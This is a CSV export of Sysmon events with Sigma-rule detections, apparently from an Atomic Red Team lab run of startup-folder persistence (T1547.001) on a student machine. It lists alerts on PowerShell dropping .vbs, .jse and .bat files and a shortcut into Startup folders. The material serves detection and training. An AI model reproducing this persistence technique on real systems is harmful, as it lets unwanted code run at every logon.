(x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 1240 ¦ PGUID: E9F06A57-6136-694E-AE01-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Medium ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:34.232","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:37.190 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173666,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-GB --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=2 --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=2400,i,2904374366359068948,10761809149815589804,524288 --field-trial-handle=1852,i,7930795831113620893,16739823868299927735,262144 --enable-features=msEdgeFluentOverlayScrollbar,msSingleSignOnOSForPrimaryAccountIsShared --variations-seed-version --trace-process-track-uuid=3190708990060038890 --mojo-platform-channel-handle=2408 /prefetch:13 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 7412 ¦ PGUID: E9F06A57-6137-694E-AF01-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:35.313","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:37.594 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173667,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=renderer --noerrdialogs --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=2 --dma-cps-flags=0 --no-pre-read-main-dll --video-capture-use-gpu-memory-buffer --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --js-flags=""--expose-gc --ms-user-locale=en_AT"" --time-ticks-at-unix-epoch=-1766744020184809 --launch-time-ticks=357388711 --ram-no-pressure-read-main-dll --metrics-shmem-handle=4148,i,6624907468847911838,17620248791250603262,2097152 --field-trial-handle=1852,i,7930795831113620893,16739823868299927735,262144 --enable-features=msEdgeFluentOverlayScrollbar,msSingleSignOnOSForPrimaryAccountIsShared --variations-seed-version --trace-process-track-uuid=3190708990997080739 --mojo-platform-channel-handle=4172 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb /prefetch:1 ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 3260 ¦ PGUID: E9F06A57-6139-694E-B101-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:37.584","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:38.079 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173668,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=renderer --noerrdialogs --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=2 --dma-cps-flags=0 --no-pre-read-main-dll --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=6 --js-flags=""--expose-gc --ms-user-locale=en-GB"" --time-ticks-at-unix-epoch=-1766744020184809 --launch-time-ticks=357700571 --skip-read-main-dll --metrics-shmem-handle=4576,i,10348090180856656646,16662829430924015031,2097152 --field-trial-handle=1852,i,7930795831113620893,16739823868299927735,262144 --enable-features=msEdgeFluentOverlayScrollbar,msSingleSignOnOSForPrimaryAccountIsShared --variations-seed-version --trace-process-track-uuid=3190708991934122588 --mojo-platform-channel-handle=4596 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb /prefetch:1 ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 8860 ¦ PGUID: E9F06A57-6139-694E-B201-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:37.928","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:38.792 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173669,"Query: wpad ¦ Result: - ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ PID: 1240 ¦ PGUID: E9F06A57-6136-694E-AE01-000000002400","QueryStatus: 9003 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:37.889","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.432 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173573,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.431","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173577,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.435","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173585,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.807","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.813 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173589,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173598,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.603","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.621 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173602,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.615","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","HackTool - Powerup Write Hijack DLL","high","DESKTOP-G2OBL3D","Sysmon",11,"Persis ¦ PrivEsc ¦ Evas","T1574.001","sysmon",173595,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","file_event_win_hktl_powerup_dllhijacking.yml","bde02a5c-5a5c-2601-fb4c-64f6ea900bd3","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","HackTool - Powerup Write Hijack DLL","high","DESKTOP-G2OBL3D","Sysmon",11,"Persis ¦ PrivEsc ¦ Evas","T1574.001","sysmon",173599,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","file_event_win_hktl_powerup_dllhijacking.yml","bde02a5c-5a5c-2601-fb4c-64f6ea900bd3","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.428 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",173570,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.425","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.434 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",173574,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",173595,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",173599,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.507 +01:00","Potential Startup Shortcut Persistence Via PowerShell.EXE","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173607,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400","CreationUtcTime: 2025-12-26 10:19:06.506 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:06.506","file_event_win_powershell_startup_shortcuts.yml","aac86f22-df36-b4f9-c1ce-3460d087ee56","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.428 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173570,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.425","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.432 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173572,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.427","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.434 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173574,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173576,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.435","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.803 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173582,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.802","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.806 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173584,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.803","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173586,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.809","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
